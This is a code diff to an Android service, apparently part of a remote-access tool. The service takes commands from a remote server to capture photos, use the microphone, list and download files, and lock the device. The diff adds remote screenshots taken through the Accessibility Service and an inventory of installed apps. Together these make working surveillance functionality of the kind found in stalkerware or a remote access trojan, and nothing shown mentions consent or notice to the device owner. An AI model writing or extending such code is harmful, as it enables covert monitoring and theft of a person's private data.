@@ -55,8 +55,10 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
 
         try {
             val result = when (commandType) {
-                "capture_photo"   -> capturePhoto(payload.optString("camera", "back"))
-                "list_files"      -> listFiles(payload.optString("path", ""))
+                "capture_photo"    -> capturePhoto(payload.optString("camera", "back"))
+                "take_screenshot"  -> takeScreenshot()
+                "list_files"       -> listFiles(payload.optString("path", ""))
+                "list_apps"        -> listInstalledApps()
                 "download_file"   -> downloadFile(payload.optString("path", ""))
                 "download_folder" -> downloadFolder(payload.optString("path", ""))
                 "start_mic",
@@ -406,6 +408,56 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
         name.endsWith(".xls",  true) || name.endsWith(".xlsx", true) -> "application/vnd.ms-excel"
         name.endsWith(".apk",  true) -> "application/vnd.android.package-archive"
         else -> "application/octet-stream"
+    }
+
+    // ── Screenshot via AccessibilityService ──────────────────────────────────
+
+    private fun takeScreenshot(): String {
+        val svc = AccessibilityMonitorService.instance
+            ?: return """{"type":"error","message":"Accessibility Service not running — enable it in Settings → Accessibility"}"""
+
+        val latch  = java.util.concurrent.CountDownLatch(1)
+        var result = """{"type":"error","message":"timeout"}"""
+
+        AccessibilityMonitorService.screenshotCallback = { r ->
+            result = r
+            AccessibilityMonitorService.screenshotCallback = null
+            latch.countDown()
+        }
+        svc.captureScreenshot()
+        latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
+        AccessibilityMonitorService.screenshotCallback = null
+        return result
+    }
+
+    // ── List installed (non-system) apps ──────────────────────────────────────
+
+    private fun listInstalledApps(): String {
+        val pm      = ctx.packageManager
+        val entries = JSONArray()
+        pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
+            .filter { app ->
+                // Only user-installed / updated-system apps
+                (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 ||
+                (app.flags and android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
+            }
+            .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
+            .forEach { app ->
+                val info = try { pm.getPackageInfo(app.packageName, 0) } catch (_: Exception) { null }
+                entries.put(JSONObject().apply {
+                    put("packageName",  app.packageName)
+                    put("appName",      pm.getApplicationLabel(app).toString())
+                    put("versionName",  info?.versionName ?: "")
+                    put("versionCode",  info?.longVersionCode ?: 0L)
+                    put("installedAt",  info?.firstInstallTime ?: 0L)
+                    put("updatedAt",    info?.lastUpdateTime  ?: 0L)
+                })
+            }
+        return JSONObject().apply {
+            put("type",    "apps")
+            put("entries", entries)
+            put("count",   entries.length())
+        }.toString()
     }
 
     // ── Lock device ───────────────────────────────────────────────────────────
